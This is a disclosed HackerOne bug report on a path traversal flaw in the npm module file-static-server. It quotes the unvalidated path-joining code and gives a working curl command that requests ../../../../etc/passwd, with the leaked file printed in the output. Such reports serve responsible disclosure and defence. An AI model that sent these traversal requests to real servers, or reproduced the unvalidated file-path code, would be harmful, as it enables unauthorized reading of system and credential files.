# [file-static-server] Path Traversal allows to read content of arbitrary file on the server

## Report Details
- **Report ID**: 310671
- **URL**: https://hackerone.com/reports/310671
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-01-30T23:37:05.758Z
- **Disclosed**: 2018-06-14T19:48:57.683Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

There is Path Traversal vulnerability in file-static-server module, which allows to read arbitrary file from the remote server.

## Module

**file-static-server**

[no description provided]

https://www.npmjs.com/package/file-static-server

version: 1.0.2

Stats
0 downloads in the last day
3 downloads in the last week
20 downloads in the last month

~250 estimated downloads per year


## Description

Vulnerability exists, because function which creates path for file to read does not implement any validation of input data and takes path just as is:

```javascript
// ./node_modules/file-static-server/lib/file.js, line 21:
getFilePath: function () {
    if (this.filePath) {
      return this.filePath
    }
    var url = this.req.url
    var len = process.argv.length
    this.filePath = path.join(process.argv[len - 1], url)
    return this.filePath
  },
```

```this.filePath``` is the used directly in function, which reads file:

```javascript
// ./node_modules/file-static-server/lib/file.js, line 87:
getStream: function () {
    return fs.createReadStream(this.filePath)
  }
```

## Steps To Reproduce:

- install ```file-static-server``` module

```
$ npm install file-static-server
```

- run server from command line:

```
$ ./node_modules/file-static-server/bin/file-static-server -P 8080 ./
server start at 8080
```

- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd
```

Result:

```
*   Trying 192.168.1.1...
* TCP_NODELAY set
* Connected to 192.168.1.1 (192.168.1.1) port 8080 (#0)
> GET /../../../../etc/passwd HTTP/1.1
> Host: 192.168.1.1:8080
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 200 OK
< server: static-1.0.2
< content-type: application/octet-stream; charset=utf-8
< content-length: 6774
< etag: 898b8e56263723beb06955d4a7c2944d1eff7a21
< cache-control: public; max-age=3153600000000
< Date: Tue, 30 Jan 2018 23:27:23 GMT
< Connection: keep-alive
<
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
(...)
```

## Supporting Material/References:

Configuration:

- macOS 10.13.3
- Chromium 66.0.3331.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.3
- npm version: 5.5.1
- curl 7.54.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows to read content of any file on the server

## Attachments
No attachments
